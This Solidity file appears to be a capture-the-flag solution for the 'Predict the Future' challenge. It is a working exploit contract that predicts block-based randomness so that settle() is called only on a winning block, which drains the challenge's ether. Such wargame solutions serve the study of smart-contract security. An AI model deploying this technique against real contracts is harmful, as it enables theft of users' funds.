pragma solidity 0.8.7;

interface IPredictTheFutureChallenge {
    function isComplete() external view returns (bool);
    function lockInGuess(uint8 num) external payable;
    function settle() external;
}

contract PredictTheFutureHack{
    IPredictTheFutureChallenge public ptfInstance;
    address public guesser;

    constructor(IPredictTheFutureChallenge _ptfInstance) payable {
        ptfInstance = _ptfInstance;

        require(msg.value >= 1, "not enough money");
        ptfInstance.lockInGuess{value: msg.value}(0);
    }

    function destroy() public payable{
        payable(tx.origin).transfer(address(this).balance);
    }

    function attack() public payable {
        uint8 numCheck = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        require ( 0 == numCheck, "not an correct number");
        ptfInstance.settle();
    }

    receive() external payable {}
}
